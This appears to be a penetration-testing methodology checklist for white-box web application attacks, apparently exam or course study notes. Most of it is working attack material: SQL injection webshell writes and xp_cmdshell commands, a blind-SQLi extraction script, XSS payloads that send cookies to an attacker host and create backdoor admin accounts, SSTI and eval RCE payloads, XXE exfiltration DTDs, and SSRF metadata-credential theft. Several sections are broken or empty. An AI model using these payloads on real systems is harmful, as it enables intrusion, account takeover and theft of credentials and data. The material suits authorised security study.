1. Methodology

  • Operator-checklist methodology for white-box web application testing. Each phase walks a vulnerability class end-to-end: identify the sink, trace the taint, confirm exploitability, chain to RCE or account takeover, write the exploit script.

1.1 Source Code Review

  • Map the application before hunting bugs. Understand routes, sinks, and data flow first — the rest of the methodology depends on this phase.

1.1.1 Route & Endpoint Mapping

  • Enumerate every route the application exposes:
    • Flask / Django: grep -rn "@app.route\|@blueprint.route\|path(" src/
    • Express: grep -rn "app.get\|app.post\|app.put\|app.delete\|router." src/
    • Spring: grep -rn "@RequestMapping\|@GetMapping\|@PostMapping" src/
    • PHP: grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|Route::" src/
    • .NET: grep -rn "\[HttpGet\|\[HttpPost\|\[Route" src/
# Route enumeration — run all greps and collate into a route map
grep -rn "@app.route\|@blueprint.route" src/        # Flask / Django
grep -rn "app.get\|app.post\|router\." src/          # Express
grep -rn "@RequestMapping\|@GetMapping\|@PostMapping" src/  # Spring
grep -rn "\$_GET\|\$_POST\|\$_REQUEST" src/          # PHP
grep -rn "\[HttpGet\]\|\[HttpPost\]\|\[Route" src/  # .NET
  • Identify pre-auth vs post-auth endpoints:
    • Check for middleware / decorators that enforce authentication
    • Map which routes skip auth checks — these are the primary targets
    • Note any role-based access control (RBAC) decorators
  • Document the API surface:
    • REST endpoints with methods and parameters
    • GraphQL schemas if present
    • WebSocket handlers
    • File upload endpoints

1.1.2 Dangerous Sink Identification

  • Grep for OS command execution sinks:
    • PHP: grep -rn "eval\|system\|exec\|passthru\|shell_exec\|popen\|proc_open" src/
    • Python: grep -rn "os\.system\|subprocess\|eval\|exec\|render_template_string" src/
    • Java: grep -rn "Runtime\.exec\|ProcessBuilder\|ScriptEngine\|EL.*Expression" src/
    • Node.js: grep -rn "eval\|exec\|execSync\|spawn\|Function(" src/
  • Grep for deserialization sinks:
    • .NET: grep -rn "BinaryFormatter\|NetDataContract\|SoapFormatter\|LosFormatter\|XmlSerializer" src/
    • Java: grep -rn "readObject\|XMLDecoder\|fromXML\|ObjectInputStream" src/
    • PHP: grep -rn "unserialize\s*(" src/
    • Node.js: grep -rn "node-serialize\|js-yaml\.load" src/

grep -rn "os\.system\|subprocess\|eval\|exec\|render_template_string" src/      # Python

  • Grep for SQL query construction:
    • String concatenation in queries: grep -rn "SELECT.*+\|INSERT.*+\|UPDATE.*+\|DELETE.*+" src/
    • Parameterized queries are safe — focus on raw string concatenation
    • ORM raw methods: grep -rn "raw\|execute\|rawQuery\|createNativeQuery" src/
  • Run automated static analysis:
    • Semgrep: semgrep --config p/php-security src/ (also p/java-security, p/nodejs-security)
    • CodeQL if the codebase is large enough to warrant it

1.1.3 Taint Tracing

  • For each dangerous sink found, trace backward to the input source:
    • Identify where user input enters: query params, POST body, headers, cookies, file uploads
    • Follow the variable through every function call, assignment, and transformation
    • Note any sanitisation or validation along the path
  • Determine if sanitisation is bypassable:
    • Blacklist-based filtering — look for bypass payloads
    • Encoding/decoding mismatches (double encoding, charset tricks)
    • Type confusion or casting issues
    • Race conditions in check-then-use patterns
  • Confirm reachability without authentication where possible:
    • Pre-auth sinks are highest value
    • Post-auth sinks still matter for privilege escalation chains

1.1.4 Debugger Setup

  • PHP — Xdebug + VS Code:
    • Install: pecl install xdebug or apt install php-xdebug
    • Config: xdebug.mode=debug, xdebug.start_with_request=yes, xdebug.client_host=host.docker.internal
    • VS Code: install PHP Debug extension, set breakpoints, launch listener on port 9003
  • Node.js — Inspector protocol:
    • node --inspect-brk=0.0.0.0:9229 app.js
    • Chrome DevTools: chrome://inspect → configure target → attach
    • VS Code: attach to running process via launch.json
  • Java — JDWP remote debug:
    • JAVA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005"
    • IntelliJ / VS Code: remote debug configuration targeting port 5005
  • Python — debugpy:
    • python3 -m debugpy --listen 0.0.0.0:5678 --wait-for-client app.py
    • VS Code: Python attach configuration targeting port 5678

1.2 Authentication Bypass

  • Test every authentication mechanism for logic flaws before moving to injection-based attacks.

1.2.1 SQL Injection Auth Bypass

  • Test the login form with classic SQLi payloads:
    • Username field: admin'--, admin'#, ' OR '1'='1
    • Password field: ' OR 1=1--, ' OR 1=1#
    • Both fields: admin' AND 1=1-- (confirm boolean blind)
  • Test for second-order SQLi in registration / profile update:
    • Register with a username containing SQL metacharacters
    • Trigger the injection when the stored value is used in a later query
  • Check for NoSQL injection on MongoDB backends:
    • JSON body: {{"user": {{"$ne": ""}}, "pass": {{"$ne": ""}}}}
    • Query string: user[$ne]=&pass[$ne]=

References: PortSwigger SQLi · PayloadsAllTheThings SQLi

1.2.2 Type Juggling & Magic Hashes

  • Test PHP loose comparison (==) bypasses:
    • Send integer 0 where string is expected: 0 == "admin" evaluates to TRUE in PHP
    • JSON content type allows type control: {{"user": 0, "pass": "anything"}}
  • Test magic hash collisions:
    • MD5 of 240610708 = 0e462097431906509019562988736854 — evaluates to 0 in loose comparison
    • SHA1 of 10932435112 = 0e07766915004133176347055865026311692244
    • If the app compares hashes with == instead of ===, supply a magic-hash input
  • Test array parameter injection:
    • Send pass[]=&pass[]= to make strcmp() return NULL (treated as 0 / equal)
    • Works when backend uses strcmp() or strcasecmp() without strict type checks

1.2.3 JWT Attacks

  • Decode and inspect the JWT structure:
    • jwt_tool "eyJ..." -d — decode header, payload, signature
    • Check alg field: RS256, HS256, none
    • Check claims: sub, role, exp, iss
  • Test algorithm confusion (RS256 → HS256):
    • jwt_tool "eyJ..." -X a -pk public.pem — sign with public key as HMAC secret
    • Requires the server’s public key (often in /.well-known/jwks.json)
  • Test none algorithm:
    • jwt_tool "eyJ..." -X n — strip signature, set alg to none
  • Brute-force weak HMAC secrets:
    • jwt_tool "eyJ..." -C -d /usr/share/wordlists/rockyou.txt
    • If cracked, forge tokens with arbitrary claims
# JWT attack commands
jwt_tool "eyJ..." -d                                    # Decode header + payload + signature
jwt_tool "eyJ..." -X a -pk public.pem                   # Algorithm confusion (RS256 → HS256)
jwt_tool "eyJ..." -X n                                  # None algorithm — strip signature
jwt_tool "eyJ..." -C -d /usr/share/wordlists/rockyou.txt  # Brute-force HMAC secret
jwt_tool "eyJ..." -T                                    # Interactive tamper mode
  • Tamper claims and re-sign:
    • jwt_tool "eyJ..." -T — interactive tamper mode
    • Change sub to admin, change role to administrator
    • Change exp to a future timestamp for expired-token bypass

1.2.4 Password Reset Flaws

  • Test for predictable reset tokens:
    • Request multiple resets, compare tokens for sequential / timestamp-based patterns
    • Brute-force short tokens if the keyspace is small
  • Test Host header injection:
    • Set Host: evil.com in the reset request
    • If the reset email contains Host-derived URL, token leaks to attacker
    • Also try X-Forwarded-Host: evil.com and X-Original-URL
  • Test parameter pollution:
    • Add duplicate email: email=victim@x.com&email=attacker@x.com
    • Some frameworks use the last value; the reset token may be sent to both

1.3 SQL Injection to RCE

  • Once SQLi is confirmed, escalate from data extraction to OS-level code execution.

1.3.1 Database Fingerprinting

  • Identify the database engine:
    • MySQL / MSSQL: SELECT @@version
    • PostgreSQL: SELECT version()
    • Oracle: SELECT banner FROM v$version
    • SQLite: SELECT sqlite_version()
  • Error-based fingerprinting when output is hidden:
    • MySQL: extractvalue(1, concat(0x7e, version()))
    • MSSQL: CONVERT(int, @@version) triggers type conversion error with version string
    • PostgreSQL: CAST(version() AS int)
  • Enumerate databases, tables, columns:
    • MySQL: SELECT schema_name FROM information_schema.schemata
    • Tables: SELECT table_name FROM information_schema.tables WHERE table_schema='target'
    • Columns: SELECT column_name FROM information_schema.columns WHERE table_name='users'

1.3.2 File Write to Webshell

  • MySQL file write (requires FILE privilege):
    • SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/shell.php'
    • Check privilege: SELECT file_priv FROM mysql.user WHERE user=current_user()
    • Check secure_file_priv variable — must be empty or writable web path
  • PostgreSQL file write via COPY:
    • COPY (SELECT '<?php system($_GET["c"]);?>') TO '/var/www/html/shell.php'
    • Requires superuser or pg_write_server_files role
  • PostgreSQL large objects for binary file writes:
    • SELECT lo_from_bytea(0, '\\x3c3f706870...') — create large object from hex payload
    • SELECT lo_export(OID, '/var/www/html/shell.php') — export to filesystem
    • Clean up: SELECT lo_unlink(OID)
# MySQL — write webshell (requires FILE privilege + empty secure_file_priv)
SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/shell.php';

# PostgreSQL — COPY to write a file
COPY (SELECT '<?php system($_GET["c"]);?>') TO '/var/www/html/shell.php';

# PostgreSQL — large objects for binary writes
SELECT lo_from_bytea(0, '\x3c3f706870...');     -- create LO from hex-encoded payload
SELECT lo_export(12345, '/var/www/html/s.php');  -- export LO to disk (use returned OID)
SELECT lo_unlink(12345);                        -- clean up
  • Confirm the webshell works:
    • curl http://target/shell.php?c=id — verify command execution
    • Upgrade to a reverse shell immediately and remove the webshell

1.3.3 OS Command Execution

  • MSSQL xp_cmdshell:
    • Enable: EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
    • Execute: EXEC xp_cmdshell 'whoami'
    • Reverse shell: EXEC xp_cmdshell 'powershell -enc [base64]'
  • PostgreSQL COPY TO PROGRAM:
    • COPY (SELECT '') TO PROGRAM 'id'
    • Requires superuser; available in PostgreSQL 9.3+
  • PostgreSQL UDF for persistent RCE:
    • Compile: gcc -I\"$(pg_config --includedir-server)\" -fPIC -shared rce_ext.c -o rce_ext.so
    • CREATE FUNCTION rce(text) RETURNS void AS '/tmp/rce_ext.so', 'rce' LANGUAGE C STRICT;
    • SELECT rce('id')
# MSSQL — enable and use xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# PostgreSQL — COPY TO PROGRAM (9.3+, requires superuser)

# Then in SQL:

1.3.4 Blind Data Extraction

  • Time-based blind injection:
    • MySQL: IF(SUBSTRING(user(),1,1)='r', SLEEP(2), 0)
    • PostgreSQL: SELECT CASE WHEN (SUBSTRING(current_user,1,1)='p') THEN pg_sleep(2) ELSE pg_sleep(0) END
    • MSSQL: IF (SUBSTRING(system_user,1,1)='s') WAITFOR DELAY '0:0:2'
  • Boolean-based blind injection:
    • Compare response length / content for TRUE vs FALSE conditions
    • MySQL: AND SUBSTRING(user(),1,1)='r'
    • Automate with binary search over ASCII values
  • Script the extraction in Python:
    • Use requests.Session() with a timing loop
    • Extract one character at a time, measure response time
    • Build the full string character by character
    • Consider sqlmap -u "http://target/?id=1" --os-shell for automation
import requests, time, string

s = requests.Session()
s.verify = False
extracted = ""

for pos in range(1, 50):
    for c in string.printable:
        # Time-based blind — MySQL example
        payload = f"' AND IF(SUBSTRING(user(),{pos},1)='{c}', SLEEP(2), 0)-- -"
        start = time.time()
        s.get(f"http://target/page?id=1{payload}")
        if time.time() - start > 2:
            extracted += c
            print(f"[+] {extracted}")
            break
    else:
        break  # no char matched — end of string

print(f"[*] Extracted: {extracted}")

1.4 Cross-Site Scripting to Account Takeover

  • Find a reflection or stored injection point, escalate to session hijacking or admin-action forgery.

1.4.1 Reflection Discovery

  • Inject a unique canary string in every input:
    • curl -s "http://target/search?q=xsscanary123" | grep xsscanary123
    • Check query parameters, POST body fields, headers (Referer, User-Agent), URL path segments
    • Note the context: inside HTML tag, inside attribute, inside <script> block, inside comment
  • Determine the rendering context:
    • HTML context: inject <img src=x onerror=alert(1)>
    • Attribute context: break out with " onmouseover="alert(1)
    • JavaScript context: break string with ';alert(1)//
    • URL context: javascript:alert(1)
  • Check for DOM-based XSS separately:
    • Dangerous sinks: innerHTML, outerHTML, document.write, eval, setTimeout
    • Sources: location.hash, location.search, document.referrer, window.name

1.4.2 Payload Crafting

  • Start with a polyglot that works in multiple contexts:
    • jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//
  • Try alternate event handlers if common ones are filtered:
    • <svg/onload=alert(1)>
    • <details open ontoggle=alert(1)>
    • <img src=x onerror=alert(1)>
    • <body onresize=alert(1)>
  • Bypass filters with encoding:
    • HTML entities: &lt;img src=x onerror=alert(1)&gt;
    • JavaScript hex: \\x3cscript\\x3ealert(1)\\x3c/script\\x3e
    • Template literals: ${{alert(1)}}
    • Unicode escapes: \\u0061lert(1)

1.4.3 Cookie & Session Theft

  • Exfiltrate cookies via fetch:
    • <script>fetch("http://LHOST/x?c="+document.cookie)</script>
    • Start a listener: python3 -m http.server 80 and watch for the cookie in the request
// Cookie exfiltration payload
<script>fetch("http://LHOST/x?c="+document.cookie)</script>

// CSRF token steal + admin action chain
<script>
fetch("/admin/settings", {credentials:"include"})
  .then(r => r.text())
  .then(html => {
    let csrf = html.match(/name="csrf_token" value="([^"]+)"/)[1];
    fetch("/admin/create-user", {
      method: "POST",
      credentials: "include",
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
      body: "username=backdoor&password=P@ss123&role=admin&csrf_token=" + csrf
    });
  });
</script>
  • Steal CSRF tokens for chained attacks:
    • Fetch the admin page: fetch("/admin/settings", {{credentials:"include"}})
    • Parse the CSRF token from the response HTML
    • POST the privileged action with the stolen token
  • Check cookie security flags:
    • HttpOnly prevents JavaScript access — pivot to CSRF-based attacks instead
    • Secure limits to HTTPS — ensure exfil URL uses HTTPS
    • SameSite may block cross-origin requests

1.4.4 XSS to Admin Actions

  • Create a backdoor admin account via stored XSS:
    • Inject payload that fetches the admin user-creation form
    • Parse the CSRF token, POST a new admin user with attacker-controlled credentials
    • Wrap in an IIFE so the payload fires once per victim visit
  • Exfiltrate sensitive data:
    • Fetch /admin/users, /api/config, database connection strings
    • Send results to http://LHOST/exfil via fetch()
  • Establish persistence:
    • IndexedDB storage for persistent loot collection across sessions
    • WebSocket channel for real-time interaction with the victim browser
    • Service Worker registration for persistent code execution

1.5 Server-Side Template Injection

  • Detect the template engine, then escalate from expression evaluation to OS command execution.

1.5.1 Template Engine Detection

  • Inject arithmetic probes to confirm template evaluation:
    • {{{{7*7}}}} — Jinja2, Twig, Handlebars (returns 49)
    • ${{7*7}} — Freemarker, Thymeleaf, EL (returns 49)
    • #{{7*7}} — Thymeleaf, Pebble (returns 49)
    • *{{7*7}} — some EL implementations
    • <%= 7*7 %> — ERB, EJS (returns 49)
  • Distinguish between engines with type-sensitive probes:
    • {{{{7*'7'}}}} — Jinja2 returns 7777777, Twig returns 49
    • {{{{"foo".__class__}}}} — Jinja2 returns <class 'str'>, others error

1.5.2 Jinja2 / Flask Exploitation

  • MRO class traversal for subprocess access:
    • {{{{''.__class__.__mro__[1].__subclasses__()[N](['id'], stdout=-1).communicate()[0]}}}}

    • {{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}

  • Filter bypass techniques:
    • Dot filter: use |attr('__class__') instead of .__class__
    • Underscore filter: hex encoding request|attr('\\x5f\\x5fglobals\\x5f\\x5f')
    • String concatenation: '\\x5f\\x5f'+'class'+'\\x5f\\x5f'

  • Twig (PHP):

    • <%= `id` %> or <%= system("id") %>
  • EJS (Node.js):
    • <%= process.mainModule.require("child_process").execSync("id") %>

1.6 XML External Entity Injection

  • Any endpoint that parses XML (file uploads, SOAP, SVG, DOCX) is a candidate. Test for file read first, then escalate.

1.6.1 Basic XXE

  • Test for classic file read:
    • <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
    • Inject the entity reference where output is reflected in the response
  • Read source code with PHP wrappers:
    • <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">
    • Decode the base64 to read the full source including <?php tags
  • Test for SSRF via XXE:
    • <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
    • <!ENTITY xxe SYSTEM "http://127.0.0.1:6379/"> (internal Redis)
# Basic XXE — file read
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

# PHP base64 wrapper — read source code including <?php tags
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">

# SSRF via XXE — AWS metadata
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

1.6.2 Blind / OOB XXE

  • When output is not reflected, use OOB exfiltration:
    • External DTD: <!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://LHOST/evil.dtd">%ext;]>
  • Craft the exfiltration DTD on your server:
    • evil.dtd: <!ENTITY % file SYSTEM "file:///etc/passwd">
    • Then: <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://LHOST/?d=%file;'>">%eval;%exfil;
    • Host at python3 -m http.server 80 and watch the incoming request
# Blind/OOB XXE — inject in the target XML
<!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://LHOST/evil.dtd">%ext;]>

# evil.dtd — host on your server (python3 -m http.server 80)
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://LHOST/?d=%file;'>">
%eval;
%exfil;
  • CDATA trick for files containing XML metacharacters:
    • Wrap the file content in CDATA sections via parameter entity chaining
    • Required when the target file contains <, >, or &

1.6.3 XXE to RCE

  • PHP expect wrapper (if enabled):
    • <!ENTITY xxe SYSTEM "expect://id"> — direct command execution
    • Rare in modern installs but check phpinfo() for expect extension
  • Chain XXE → SSRF → internal service exploitation:
    • Read cloud metadata IAM credentials via XXE SSRF
    • Hit internal admin panels or APIs that trust localhost
    • Exploit internal services with known vulnerabilities (Redis, Consul)
  • File write via XXE (rare):
    • Some parsers allow SYSTEM entity with file:// write semantics
    • More common: use the file-read to find credentials, then use those for RCE

2. Source Code Review Methodology

  • Start at entry points (routes/controllers that accept input) and follow tainted data downstream

3.1 SQL Injection Auth Bypass

  • When a login query is string-concatenated, inject a comment that makes the WHERE clause always true or inject a valid second user

6. CSRF, CORS & SameSite Bypass

  • Canonical chain combines CSRF + permissive CORS into a pre-auth account takeover
  • Same-Origin Policy, CORS, and SameSite cookies need to be reasoned about together

6.1 Same-Origin Policy (SOP)

  • SOP prevents scripts on origin A from reading responses from origin B
  • “Origin” = scheme + host + port
  • SOP does not block requests being sent (CSRF still works); it blocks reading the response
  • Anything that relaxes SOP — CORS misconfig, postMessage misuse, JSONP — can flip a CSRF into a full read-and-write attack

6.2 CORS Misconfiguration

  • Misconfigurations: reflecting the request Origin verbatim, allowing null, subdomain wildcards, shipping Access-Control-Allow-Credentials: true alongside a permissive origin
# Probe for an origin-reflecting CORS policy
curl -i -H "Origin: http://evil.com" http://target/api/profile
# If the response includes:
#   Access-Control-Allow-Origin: http://evil.com
#   Access-Control-Allow-Credentials: true
# any attacker page can read /api/profile with the victim's cookies attached.

# Other misconfigs to test
curl -i -H "Origin: null" http://target/api/profile   # sandboxed iframes / data: URIs
curl -i -H "Origin: http://target.evil.com" http://target/api/profile  # subdomain wildcard

6.3 SameSite Cookies

  • Strict: strips cookies on any cross-site request
  • Lax: sends on top-level GET navigations only
  • None: always sends (requires Secure)
  • Modern browsers default to Lax — classic POST CSRF doesn’t carry the session cookie
  • Bypasses: top-level GET navigations still send Lax cookies; brand-new cookies (< 2 minutes old) bypass Lax in Chrome; same-site subdomain requests carry cookies normally

6.4 Classic CSRF Exploitation

  • Auto-submit a form from the attacker page; the victim’s browser attaches their cookies (subject to SameSite)
  • For JSON endpoints, build the form to encode as JSON or use fetch + a CORS-friendly content type

10. Server-Side Request Forgery (SSRF)

  • Includes blind SSRF, internal port scanning, headless Chrome JS injection, and the Kong Admin API takeover
  • Anywhere a parameter takes a URL or hostname is a candidate

10.1 Finding & Exploiting SSRF

  • URL-accepting parameters: url, host, callback, fetch, webhook, redirect, imageurl, proxy, src
  • Common targets: cloud metadata (AWS IMDSv1 at 169.254.169.254), internal admin panels, Redis, Consul, Docker socket

10.2 API Discovery via Verb Tampering

  • Microservices behind SSRF often expose admin actions on undocumented verbs (PUT, DELETE, PATCH)
  • Directus chain enumerates endpoints by swapping the verb until a hidden response surfaces

10.4 Blind SSRF Port Scanning

  • When SSRF response is fully blind, time differences become the oracle
  • Port returning RST is fast; port accepting and waiting for protocol bytes is slow
import requests, time
def probe(host, port):
    t0 = time.time()
    try:
        requests.post(SSRF, json={"url": f"http://{host}:{port}"}, timeout=5)
    except requests.Timeout:
        return time.time() - t0
    return time.time() - t0

for ip in [f"10.0.0.{i}" for i in range(1, 255)]:
    for p in [22, 80, 443, 3306, 5432, 6379, 8500]:
        dt = probe(ip, p)
        if dt > 1.5:    # slow response -> likely open
            print(f"[+] {ip}:{p} - {dt:.1f}s")

11. Prototype Pollution (Node.js)

  • Guacamole Lite chapter shows the modern Node.js exploitation primitive end-to-end
  • A recursive merge function lets attacker JSON pollute Object.prototype, and known template-engine gadgets turn that into RCE

11.1 Concept

  • JavaScript prototype chain: every object inherits from Object.prototype
  • If attacker input reaches obj[key] = value where key can be __proto__ or constructor.prototype, attacker adds properties to every object in the process
// Vulnerable recursive merge
function merge(dst, src) {
  for (let k in src) { dst[k] = src[k]; }  // no prototype check!
}
// Attacker payload: {"__proto__": {"isAdmin": true}}
// After merge: ({}).isAdmin === true  (every object "is admin")

11.2 Finding & Discovering Pollution Sinks

  • Blackbox: post {"__proto__":{"polluted":true}} to JSON endpoints, check for reflected properties
  • Whitebox: grep for unsafe recursive merge/extend/clone without hasOwnProperty guard
  • Check dependency versions for known-vulnerable lodash (< 4.17.12), jQuery (< 3.4), minimist
# Whitebox: hunt for unsafe deep merge / assign / recursive clone
grep -rn "merge\|assign\|extend\|clone\|deepCopy" src/ | grep -v "Object.assign"
# Look for: obj[key] = val without hasOwnProperty check, vulnerable lodash, jQuery, minimist

# Blackbox: pollute then probe
# POST {"__proto__":{"polluted":true}} to any JSON endpoint
# Then check: GET /health -> response headers or body may reflect properties

12. Command Injection & Eval/Filter Bypass

  • Dolibarr chapter shows a real-world filter bypass against PHP eval()
  • Blocklist of dangerous keywords defeated with reflection, alternate encodings, and string-construction tricks

12.1 PHP Command Injection & eval()

  • Dangerous sinks: system(), exec(), passthru(), shell_exec(), popen(), proc_open(), backtick operator, eval()
  • Inject metacharacters: ;, |, &, &&, $(...), backticks
  • For eval(), construct equivalent code that bypasses the filter
// Sink pattern
system("ping -c 1 " . $_GET['host']);    // inject: 127.0.0.1; id

// PHP disable_functions bypass via mail() (sendmail_path unhardened)
mail("","","","","-X/var/www/html/shell.php");  // -X writes debug to file

// .htaccess bypass: AddType application/x-httpd-php .jpg -> .jpg runs as PHP

// eval() filter bypass (Dolibarr chapter)
// Blocked: "system", "exec", "shell" - bypass by constructing the name

// Reflection / variable functions
$fn = $_GET['fn']; $fn($cmd);  // call any function by name from a parameter
// Alternate encodings: system -> "system" via Unicode

12.2 Python eval / exec Injection

  • Raw eval() on user input is straight RCE
  • Sandboxed eval() (no builtins) can still escape via the class hierarchy — same trick as Jinja2 SSTI
# eval() with user input -> straight RCE

# Sandbox escape: walk the MRO to subprocess.Popen
().__class__.__base__.__subclasses__()       # find <class 'subprocess.Popen'>
().__class__.__base__.__subclasses__()[N](['id'], stdout=-1).communicate()

12.3 Node.js exec / spawn / Function()

  • Template-literal concatenation into a shell command is a command injection primitive
  • Function constructor and eval compile strings into code — never feed user input to either
// Direct injection
require('child_process').execSync(`ping -c1 ${userInput}`);
// Payload: ; id   OR  `id`   OR  $(id)

// Template literals in shell strings

exec(cmd, callback);

// Function constructor = eval
const f = new Function("x", req.body.code);   // RCE via req.body.code

12.4 Filter Bypass Tricks (Dolibarr)

  • Defeat the blocklist by never spelling out the blocked strings
  • Techniques: reflection (call by reference), alternate encodings (Unicode, hex), string modifications (concatenation, slicing, base conversion)
// String concatenation

// Reverse: call strrev, then call the result
$x = strrev("metsys"); $x("id");

// Base-64 round-trip
$x = base64_decode("c3lzdGVt"); $x("id");

// Variable variables
$a = "system"; $$a = "id"; ${$a}($id);   // shaped to avoid keywords appearing literally

// PHP create_function() (deprecated but lab targets sometimes still have it)
$f = create_function('', $_GET['code']); $f();

13.1 File Upload Bypass

shell.jpg.php             # same - depends on config

14. Web Application Firewall (WAF) Bypass

  • RudderStack chapter exploits SQLi protected by Coraza WAF
  • Modern WAFs match signatures and AST patterns, not raw substrings — bypass by varying syntax in ways the signature didn’t anticipate

14.1 Reading the Ruleset (White-Box)

  • White-box: WAF rules are in the source tree — find them (coraza/conf, modsecurity/rules, .conf files with SecRule)
  • Identify which patterns match what, then craft inputs that don’t match
  • Blackbox: send progressively benign payloads until one passes, then walk syntactically equivalent forms

14.2 WAF Bypass for SQLi

  • Vary case, inject inline comments, swap whitespace for tabs/newlines/parentheses, double-encode, switch keywords for synonyms
